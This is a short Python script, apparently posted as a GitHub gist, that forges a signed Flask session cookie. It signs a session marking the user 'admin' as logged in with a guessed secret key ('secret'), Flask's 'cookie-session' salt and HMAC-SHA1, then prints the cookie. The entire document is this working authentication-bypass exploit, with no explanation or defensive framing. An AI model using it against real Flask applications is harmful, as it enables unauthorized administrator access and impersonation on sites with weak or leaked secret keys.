#date: 2022-06-03T17:04:17Z
#url: https://api.github.com/gists/c699d8087c70afcc07d01b0e5f961eb2
#owner: https://api.github.com/users/kavishkagihan

from flask.json.tag import TaggedJSONSerializer
from itsdangerous import URLSafeTimedSerializer, TimestampSigner, signer
import hashlib
from itsdangerous.exc import BadSignature
import sys

user = 'admin'
secret = "secret"
session = {'logged_in' : True, "username" : user.strip()}

print(
    URLSafeTimedSerializer(
        secret_key=secret,
        salt='cookie-session',
        serializer=TaggedJSONSerializer(),
        signer=TimestampSigner,
        signer_kwargs={
            'key_derivation' : 'hmac',
            'digest_method' : hashlib.sha1
        }
    ).dumps(session)
)